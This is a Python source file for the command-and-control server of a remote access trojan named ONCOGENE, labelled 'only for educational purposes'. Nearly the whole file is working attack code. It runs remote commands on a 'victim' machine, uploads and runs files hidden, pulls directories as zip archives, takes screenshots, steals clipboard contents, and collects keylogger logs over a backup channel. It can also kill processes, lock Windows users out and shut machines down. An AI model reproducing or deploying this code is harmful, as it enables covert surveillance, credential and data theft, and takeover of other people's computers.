"""

+-----------------------------------------------------------------------+
|                               ONCOGENE                                |
|    Author: f0lg0                                                      |
|    Version: 0.5.0                                                     |
|    Last update: 12-04-20 (dd-mm-yyy)                                  |
|                                                                       |
|                 [   ONLY FOR EDUCATIONAL PURPOSES   ]                 |
+-----------------------------------------------------------------------+

------- CONFIGURATION ------
In order to use this tool you need to do some tweaking:
    1. The Server's IP gets automatically set by taking the address from /etc/hosts (Linux), check if your LAN address exists in this file. I had to put it manually since there was only localhost.
    2. Select a PORT number, the default value setted in the client file is 1234
    3. Play around with the paths, I've set some default values but you can change them

------ NOTE ------
This code was tested and developed on a Linux machine, it may not work on other machines.

"""
import socket
import sys
import os
import time

from zipfile import ZipFile
from displayBanner import banner
from mainMenu import mainMenu


class Server:
    def __init__(self, ip, port, buffer_size):
        self.IP = ip
        self.PORT = port
        self.BACKUP_PORT = 8080
        self.BUFFER_SIZE = buffer_size

        self.connections = [] # connections list
        self.info = "" # info about target
        self.recvcounter = 0 # counter for received files

        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def startServer(self):
        self.server.bind((self.IP, self.PORT))
        self.server.listen(1)

        self.acceptConnections()

    def acceptConnections(self):
        print("*** Listening for incoming connections ***")

        self.client_socket, self.address = self.server.accept()
        print(f"*** Connection from {self.address} has been established! ***")
        self.connections.append(self.client_socket)

        self.choose()

    def checkConnection(self):
        """ Checks periodically if the client is up by sending random data """

        try:
            self.client_socket.send("#".encode("utf-8"))
            time.sleep(0.1) # sleep to avoid data congestion

            return True
        except Exception:
            """ Target disconnected beacuse it has not responded to the message """

            print(f"[!] {self.address[0]} disconnected")
            self.client_socket.close()

            return False

    def closeConnection(self):
        self.connections.remove(self.client_socket)
        self.client_socket.close()
        self.server.close()

    def choose(self):
        """ Main Menu """

        flag = False # flag to avoid checking if connection is up, if false then check otherwise not
        while True:
            if flag == False:
                if self.checkConnection() == False:
                    """ Client is down, trying to receive backup data (logs) """

                    try:
                        self.backupConnection()
                    except KeyboardInterrupt:
                        print("\n[ STOPPED RECEIVING DATA ]")
                    except:
                        print("[!] Client closed the backup process. He's onto you!")
                    break
            else:
                # flag is true so skipping checking and re-setting the flag to false
                flag = False

            mainMenu()

            i = input()

            if i == '--shell':
                try:
                    self.reverseShell()
                    os.system("clear")
                except ConnectionResetError:
                    """ if the target hard-closes the connection we will receive only a RST packet (TCP), so here we close the connection safely """
                    
                    self.closeConnection() # we are not breaking because there's the backup feature at the begging of the loop, just to avoid repeating lines of code. Obviuosly the checkConnection will return false
                except:
                    print("[!] Something went wrong.")

            elif i == '--ginfo':
                try:
                    self.info = self.getTargetInfo()
                    print("*** Done ***")
                except ConnectionResetError:
                    self.closeConnection() # same here and so on in the code
                except:
                    print("[!] Something went wrong.")

            elif i == '--shutdown':
                try:
                    self.shutdownTarget()
                except:
                    print("[!] Something went wrong.")

            elif i == '--close':
                try:
                    self.disconnectTarget()
                except:
                    print("[!] Something went wrong.")

                while True:
                    fireup = input("*** Do you want to start the listener again [y/n]?")

                    if fireup == "y":
                        self.info = "" # clear info about target
                        self.connections.remove(self.client_socket) # removing old connection

                        try:
                            """ Getting backup data """
                            self.backupConnection()
                        except KeyboardInterrupt:
                            print("\n[ STOPPED RECEIVING DATA ]")

                        self.acceptConnections()
                    elif fireup == "n":
                        self.server.close()
                        break
                    else:
                        print("[!] Invalid choice, retry.")

                try:
                    self.backupConnection()
                except KeyboardInterrupt:
                    print("\n[ STOPPED RECEIVING DATA ]")
                except:
                    print("[!] Client closed the backup process. He's onto you!")

                break

            elif i == '--screenshot':
                try:
                    self.takeScreenshot()
                except ConnectionResetError:
                    self.closeConnection()
                except:
                    print("[!] Something went wrong.")

            elif i == '--upload':
                try:
                    self.uploadFile()
                except:
                    print("[!] Something went wrong.")

            elif i == '--run':
                try:
                    self.runFile()
                except ConnectionResetError:
                    self.closeConnection()
                except:
                    print("[!] Something went wrong.")

            elif i == '--download':
                try:
                    self.downloadFiles()
                except ConnectionResetError:
                    self.closeConnection()
                except:
                    print("[!] Something went wrong")

            elif i == '--kill':
                try:
                    if self.info == "win32": # works only for Windows machines
                        self.killProcessWin()
                    elif self.info == "":
                        print("[!] Get target info!")
                    else:
                        print("[!] Not a Windows machine")
                except ConnectionResetError:
                    self.closeConnection()

            elif i == '--msg':
                try:
                    if self.info == "win32":
                        self.sendOsMessage()
                    elif self.info == "":
                        print("[!] Get target info!")
                    else:
                        print("[!] Not a Windows machine")
                except ConnectionResetError:
                    self.closeConnection()

            elif i == '--lock':
                try:
                    if self.info == "win32":
                        self.lockWindows()
                    elif self.info == "":
                        print("[!] Get target info!")
                    else:
                        print("[!] Not a Windows machine")
                except ConnectionResetError:
                    self.closeConnection()

            elif i == '--stop':
                try:
                    self.stopKeyLogger()
                except ConnectionResetError:
                    self.closeConnection()

            elif i == '--getlogs':
                try:
                    self.getKeyLogs()
                except ConnectionResetError:
                    self.closeConnection()
                except:
                    print("[!] Something went wrong")

            elif i == '--ccb':
                try:
                    self.getClipBoard()
                except ConnectionResetError:
                    self.closeConnection()
                except:
                    print("[!] Something went wrong")

            elif i == 'esc':
                self.server.close()
                sys.exit()
            else:
                print("[!] Invalid choice, retry.")
                flag = True  # skip checking connection

        sys.exit()

    # try to update the buffer with recv sized
    def updateBuffer(self, size):
        buff = ""
        for counter in range(0, len(size)):
            if size[counter].isdigit():
                buff += size[counter]

        return int(buff)

    # for files bigger than buffer
    def saveBigFile(self, size, buff):
        full = b''
        while True:
            if sys.getsizeof(full) >= size:
                break

            recvfile = self.client_socket.recv(buff)

            full += recvfile

        return full

    def getTargetInfo(self):
        command = "--ginfo"
        self.client_socket.send(command.encode("utf-8"))

        info = self.client_socket.recv(self.BUFFER_SIZE).decode("utf-8")
        more = self.client_socket.recv(self.BUFFER_SIZE)

        """ writing additional information in a file """

        with open('../receivedfile/info.txt', 'wb+') as f:
            f.write(more)

        print("\n# OS:" + info)
        print("# IP:" + self.address[0])
        print("*** Check info.txt for more details on the target ***")

        return info

    def shutdownTarget(self):
        command = ""

        if self.info == "win32":
            command = "shutdown /s"
            self.client_socket.send(command.encode("utf-8"))

            self.client_socket.close()
            print(f"[!] {self.address[0]} has been shut off")
        elif self.info == "linux":
            command = "shutdown -h now"
            self.client_socket.send(command.encode("utf-8"))

            self.client_socket.close()
            print(f"[!] {self.address[0]} has been shut off")
        else:
            print("[!] Shutdown command not known.")
            print("*** Try to get more informations on the target ***")

    def disconnectTarget(self):
        command = "--esc"

        self.client_socket.send(command.encode("utf-8"))
        print("*** Killed")

    def takeScreenshot(self):
        command = "--takescreen"
        self.client_socket.send(command.encode("utf-8"))

        # recv file size
        recvsize = self.client_socket.recv(self.BUFFER_SIZE)
        size = recvsize.decode("utf-8")
        time.sleep(0.1)

        # updating buffer
        buff = self.updateBuffer(size)

        # getting the file
        print("*** Saving screenshot ***")
        fullscreen = self.saveBigFile(int(size), buff)

        # saving the file
        with open(f'../receivedfile/{time.time()}.png', 'wb+') as screen:
            screen.write(fullscreen)

        print("*** File saved ***")

    def uploadFile(self):
        while True:
            try:
                path = input("[+] Enter file path: ")

                if not os.path.exists(path):
                    raise FileNotFoundError
                else:
                    break
            except FileNotFoundError:
                print("[!] File not found, retry")

        command = "--recv"
        self.client_socket.send(command.encode("utf-8"))

        name = input("[+] Save to victim as: ") # file name, must include extension
        self.client_socket.send(name.encode("utf-8"))

        with open(path, 'rb') as f:
            # sending file size
            fsize = os.path.getsize(path)
            size = str(fsize)
            self.client_socket.send(size.encode("utf-8"))
            time.sleep(0.1)

            # sending file
            print("*** Sending file ***")
            sfile = f.read()
            self.client_socket.send(sfile)

        print("*** File sent ***")

    def runFile(self):
        """ Run python file in a hidden window """

        command = "--run"
        self.client_socket.send(command.encode("utf-8"))

        exfile = input("[+] Enter file path: ")
        self.client_socket.send(exfile.encode("utf-8"))
        print("*** File path sent.")

        # get feedback
        print("*** Receiving response ***")
        response = self.client_socket.recv(self.BUFFER_SIZE)
        print("*** " + response.decode("utf-8") + " ***")

    def downloadFiles(self):
        command = "--download"
        self.client_socket.send(command.encode("utf-8"))

        path = input("[+] Enter path (NOT A SINGLE FILE): ")
        self.client_socket.send(path.encode("utf-8"))

        response = self.client_socket.recv(self.BUFFER_SIZE)
        if response.decode("utf-8") == "OK":
            # recv size
            size = self.client_socket.recv(self.BUFFER_SIZE).decode("utf-8")
            time.sleep(0.1)

            if int(size) <= self.BUFFER_SIZE:
                # recv archive
                archive = self.client_socket.recv(self.BUFFER_SIZE)
                print("*** Got file ***")

                with open(f'../receivedfile/received{str(self.recvcounter)}.zip', 'wb+') as output:
                    output.write(archive)

                print("*** File saved ***")
                self.recvcounter += 1

            else:
                # update buffer
                buff = self.updateBuffer(size)

                # recv archive
                fullarchive = self.saveBigFile(int(size), buff)

                print("*** Got file *** ")
                with open(f'../receivedfile/received{str(self.recvcounter)}.zip', 'wb+') as output:
                    output.write(fullarchive)

                print("*** File saved ***")
                self.recvcounter += 1
        else:
            print(response.decode("utf-8"))

    # task manager
    def killProcessWin(self):
        command = "--kill"
        self.client_socket.send(command.encode("utf-8"))

        procname = input("[+] Enter process name: ")
        self.client_socket.send(procname.encode("utf-8"))

        status = self.client_socket.recv(self.BUFFER_SIZE).decode("utf-8")
        print(status)

    # message box
    def sendOsMessage(self):
        """ Send a UI mesage to the target, Windows has these message boxes """

        command = "--msg"
        self.client_socket.send(command.encode("utf-8"))

        msg = input("[+] Enter message: ")
        self.client_socket.send(msg.encode("utf-8"))

        status = self.client_socket.recv(self.BUFFER_SIZE).decode("utf-8")
        print(status)

    # locks the user out while keeping connection up
    def lockWindows(self):
        command = "--lock"
        self.client_socket.send(command.encode("utf-8"))

        response = self.client_socket.recv(self.BUFFER_SIZE).decode("utf-8")
        print(response)

    def stopKeyLogger(self):
        command = "--stop"
        self.client_socket.send(command.encode("utf-8"))

        response = self.client_socket.recv(self.BUFFER_SIZE).decode("utf-8")
        print(response)

    def getKeyLogs(self):
        """ Receiving the keylogger files """

        command = "--getlogs"
        self.client_socket.send(command.encode("utf-8"))

        flag = self.client_socket.recv(self.BUFFER_SIZE).decode("utf-8")
        if flag == "[OK]":
            # recv size
            size = self.client_socket.recv(self.BUFFER_SIZE).decode("utf-8")
            time.sleep(0.1)

            if int(size) <= self.BUFFER_SIZE:
                # recv archive
                archive = self.client_socket.recv(self.BUFFER_SIZE)
                print("*** Got logs ***")

                with open('../receivedfile/keylogs.zip', 'wb+') as output:
                    output.write(archive)

                print("*** Logs saved ***")

            else:
                # update buffer
                buff = self.updateBuffer(size)

                # recv archive
                fullarchive = self.saveBigFile(int(size), buff)

                print("*** Got logs ***")
                with open('../receivedfile/keylogs.zip', 'wb+') as output:
                    output.write(fullarchive)

                print("*** Logs saved ***")
        else:
            print("[!] FATAL: Logs do not exist!")

    def getClipBoard(self):
        """ Get victim' clipboard in plain text """

        command = "--ccb"
        self.client_socket.send(command.encode("utf-8"))

        # recv clipboard
        cb = self.client_socket.recv(self.BUFFER_SIZE)
        print("*** Got clipboard ***")

        with open('../receivedfile/cb.txt', 'w+') as f:
            f.write(cb.decode("utf-8"))

        print("*** Wrote it to cb.txt ***")

    def reverseShell(self):
        """ This is not a real interactive shell, you get the output
        of the command but you can't interact with it """

        print("[!] --back to exit shell")
        while True:
            command = input(f"[{self.address[0]}]$ ")

            if not command:
                print("[!] Can't send empty command.")
                continue

            if command.lower() == "--back":
                break

            self.client_socket.send(command.encode("utf-8"))

            output = self.client_socket.recv(self.BUFFER_SIZE)

            if not output:
                self.connections.remove(self.client_socket)
                self.client_socket.close()
                self.server.close()
                break

            print(output.decode("utf-8"))

    def backupConnection(self):
        """ Creating a new socket to receive the key logger files in case the main connection
            gets cut """

        while True:
            print("*** Trying to receive keylogger logs... ***")

            newserver = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            newserver.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            newserver.bind((self.IP, self.BACKUP_PORT))
            newserver.listen(1)
            newserver.settimeout(60) # to avoid being stuck in a loop if the backup feature gets killed too
            try:
                clientbackup, addr = newserver.accept()
            except socket.timeout:
                print("*** Connection timed out, the backup feature has been closed. They are onto you! ***")
                break

            # recv size
            size = clientbackup.recv(self.BUFFER_SIZE).decode("utf-8")
            time.sleep(0.1)

            if int(size) <= self.BUFFER_SIZE:
                # recv
                logs = clientbackup.recv(self.BUFFER_SIZE)

                with open(f'../receivedfile/backup.zip', 'wb+') as output:
                    output.write(logs)

                print("*** Keylogger files saved on this machine. ***")

                clientbackup.close()
                newserver.close()
                break

            else:
                # update buffer
                buff = self.updateBuffer(size)

                # recv
                full = b''
                while True:
                    if sys.getsizeof(full) >= int(size):
                        break

                    recvfile = clientbackup.recv(buff)

                    full += recvfile

                with open(f'../receivedfile/backup.zip', 'wb+') as output:
                    output.write(full)

                print("*** Keylogger files saved on this machine. ***")

                clientbackup.close()
                newserver.close()
                break


def main():
    """ Creating the necessary dirs """

    try:
        os.mkdir('../receivedfile')
    except FileExistsError:
        pass

    banner()
    time.sleep(1)

    HOSTNAME = socket.gethostname()
    IP = socket.gethostbyname(HOSTNAME)
    PORT = int(input("[+] Listen on port> "))
    BUFFERSIZE = 2048

    server = Server(IP, PORT, BUFFERSIZE)

    try:
        server.startServer()
    except Exception as e:
        print("*** Error while starting the server:", str(e) + " ***")


if __name__ == "__main__":
    main()
